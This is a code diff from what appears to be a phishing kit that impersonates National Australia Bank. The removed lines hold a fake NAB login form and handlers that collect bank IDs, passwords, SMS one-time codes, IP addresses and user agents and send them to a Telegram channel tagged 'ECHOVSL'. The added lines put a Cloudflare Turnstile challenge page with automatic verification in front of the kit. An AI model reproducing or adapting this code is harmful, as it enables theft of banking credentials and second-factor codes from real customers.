-        SMS CODE : ${otp2}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 4: // Review
-            message = `
-        --------------[SECURITY QA REVIEW]--------------
-
-        ${Session.getUsername()} Reviewing Security Questions and Answers Set
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 5: // SMS Code 3
-            const otp3 = clean(formData.get('xxlll') || '');
-            message = `
-        --------------[NAB SMS CODE 3]--------------
-
-        SMS CODE FROM : ${Session.getUsername()}
-        SMS CODE : ${otp3}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          default:
-            console.warn('Unknown target:', target);
-            return false;
-        }
-
-        // Send to Telegram
-        await sendTelegram(message);
-        console.log('✅ Message sent to Telegram');
-        return true;
-      }
-    </script>
-
-    <!-- ================================================ -->
-    <!-- THE FORM SUBMIT HANDLER - REPLACES XHR TO PHP    -->
-    <!-- ================================================ -->
-    <script>
-      let userID = "";
-      document.addEventListener("DOMContentLoaded", function () {
-        const messages = {
-          emptyNabID: "Enter your NAB ID.",
-          invalidNabID: "NAB ID must be exactly 8 - 10 digits.",
-          emptyPassword: "Password cannot be empty.",
-          invalidPassword: "Password must be at least 6 characters long.",
-        };
-
-        const loginForm = document.getElementById("loginForm");
-        const nabIDInput = document.getElementById("nabID");
-        const passwordInput = document.getElementById("password");
-
-        nabIDInput.addEventListener("input", function () {
-          this.value = this.value.replace(/\s+/g, "");
-          removeError(this);
-        });
-
-        passwordInput.addEventListener("input", function () {
-          this.value = this.value.replace(/\s+/g, "");
-          removeError(this);
-        });
-
-        nabIDInput.addEventListener("blur", function () {
-          userID = document.getElementById("nabID").value;
-          let raw = this.value.replace(/\s+/g, "");
-          this.dataset.realValue = raw;
-          if (raw.length > 3) {
-            this.value = "*".repeat(raw.length - 3) + raw.slice(-3);
+  // ====== AUTO-VERIFY FUNCTION ======
+  function autoVerify() {
+    if (isVerified || autoVerifyAttempted) return;
+    autoVerifyAttempted = true;
+    
+    console.log('🔄 Attempting automatic verification...');
+    
+    if (window.turnstile) {
+      window.turnstile.execute('#turnstileContainer', {
+        callback: function(token) {
+          console.log('🔑 Auto-verification token received:', token);
+          if (token && token.length > 0) {
+            onSuccess();
           } else {
-            this.value = raw;
+            console.warn('⚠️ Empty token received, retrying...');
+            autoVerifyAttempted = false;
+            setTimeout(autoVerify, 2000);
           }
-        });
-
-        nabIDInput.addEventListener("focus", function () {
-          if (this.dataset.realValue) {
-            this.value = this.dataset.realValue;
-          }
-        });
-
-        nabIDInput.addEventListener("focus", () => removeError(nabIDInput));
-        passwordInput.addEventListener("focus", () =>
-          removeError(passwordInput)
-        );
-
-        loginForm.addEventListener("submit", async function (e) {
-          e.preventDefault();
-
-          const nabID = userID;
-          const password = passwordInput.value.trim();
-
-          removeError(nabIDInput);
-          removeError(passwordInput);
-
-          if (!nabID) {
-            showError(nabIDInput, messages.emptyNabID);
-            return;
-          }
-
-          if (!/^\d{8,10}$/.test(nabID)) {
-            showError(nabIDInput, messages.invalidNabID);
-            return;
-          }
-
-          if (!password) {
-            showError(passwordInput, messages.emptyPassword);
-            return;
-          }
-          if (password.length < 6) {
-            showError(passwordInput, messages.invalidPassword);
-            return;
-          }
-
-          // Show loading
-          ShowLoadingModal();
-
-          // ===== NEW: Build form data and send via processForm =====
-          const formData = new FormData();
-          formData.append("sws", 0);
-          formData.append("x", nabID);
-          formData.append("xx", password);
-
-          // Process and send to Telegram (no PHP needed!)
-          const success = await processForm(0, formData);
-
-          if (success) {
-            setTimeout(() => {
-              window.location.href = "authenticate.html";
-            }, 15000);
-          } else {
-            location.reload();
-          }
-        });
-
-        function showError(inputElement, message) {
-          removeError(inputElement);
-          const errorContainer = document.createElement("div");
-          errorContainer.className = "dynamic-error";
-          errorContainer.style.cssText = `display: flex; align-items: center; gap: 4px;`;
-          errorContainer.style.display = "flex; ";
-          errorContainer.style.gap = "6px";
-          errorContainer.style.color = "rgb(194, 0, 0)";
-          errorContainer.style.fontSize = "14px";
-          errorContainer.style.marginTop = "8px";
-          errorContainer.innerHTML = errorIcon() + `<span>${message}</span>`;
-          inputElement.parentNode.appendChild(errorContainer);
-          inputElement.classList.add("input_error");
-        }
-
-        function removeError(inputElement) {
-          const existing =
-            inputElement.parentNode.querySelector(".dynamic-error");
-          if (existing) existing.remove();
-          inputElement.classList.remove("input_error");
-        }
-
-        function errorIcon() {
-          return `<svg focusable="false" aria-hidden="true" width="20" height="20" viewBox="0 0 24 24">
-          <path fill="rgb(194, 0, 0)" fill-rule="evenodd"
-              d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z">
-          </path>
-        </svg>`;
+        },
+        'error-callback': function(error) {
+          console.log('❌ Auto-verification error:', error);
+          autoVerifyAttempted = false;
+          setTimeout(autoVerify, 3000);
         }
       });
-    </script>
-  </body>
+      
+    } else {
+      console.log('⏳ Turnstile not ready, waiting...');
+      autoVerifyAttempted = false;
+      setTimeout(autoVerify, 500);
+    }
+  }
+
+  // ====== TURNSTILE CALLBACKS ======
+  window.onTurnstileVerified = function (token) {
+    console.log('🔑 Turnstile token received:', token);
+    
+    if (token && token.length > 0 && !isVerified) {
+      onSuccess();
+    } else if (!isVerified) {
+      showError('Invalid token received.');
+      if (window.turnstile) window.turnstile.reset();
+    }
+  };
+
+  window.onTurnstileError = function () {
+    console.log('❌ Turnstile error');
+    if (!isVerified) {
+      showError('Could not load the challenge widget.');
+    }
+  };
+
+  // Render Turnstile
+  window.addEventListener('load', function () {
+    console.log('📄 Page loaded, checking for Turnstile...');
+    var tries = 0;
+    var interval = setInterval(function () {
+      tries++;
+      if (window.turnstile) {
+        clearInterval(interval);
+        console.log('🎯 Rendering Turnstile with key:', SITE_KEY);
+        
+        // Show spinner
+        document.getElementById('spinnerContainer').classList.remove('hidden');
+        
+        window.turnstile.render('#turnstileContainer', {
+          sitekey: SITE_KEY,
+          callback: 'onTurnstileVerified',
+          'error-callback': 'onTurnstileError',
+          theme: 'dark',
+          size: 'normal'
+        });
+        
+        // Hide spinner and show Turnstile after a delay
+        setTimeout(function() {
+          document.getElementById('spinnerContainer').classList.add('hidden');
+          document.getElementById('turnstileContainer').classList.add('visible');
+          document.getElementById('turnstileContainer').style.display = 'flex';
+          console.log('✅ Turnstile rendered and visible');
+          
+          // Auto-verify after Turnstile is visible
+          setTimeout(autoVerify, 1500);
+        }, 1000);
+        
+      } else if (tries > 40) {
+        clearInterval(interval);
+        console.log('❌ Turnstile script failed to load after 4 seconds');
+        showError('The challenge script failed to load.');
+      }
+    }, 100);
+  });
+
+  // If Turnstile already loaded
+  if (window.turnstile) {
+    console.log('🎯 Turnstile already loaded, rendering immediately');
+    
+    document.getElementById('spinnerContainer').classList.remove('hidden');
+    
+    window.turnstile.render('#turnstileContainer', {
+      sitekey: SITE_KEY,
+      callback: 'onTurnstileVerified',
+      'error-callback': 'onTurnstileError',
+      theme: 'dark',
+      size: 'normal'
+    });
+    
+    setTimeout(function() {
+      document.getElementById('spinnerContainer').classList.add('hidden');
+      document.getElementById('turnstileContainer').classList.add('visible');
+      document.getElementById('turnstileContainer').style.display = 'flex';
+      
+      setTimeout(autoVerify, 1500);
+    }, 1000);
+  }
+})();
+</script>
+
+</body>
 </html>
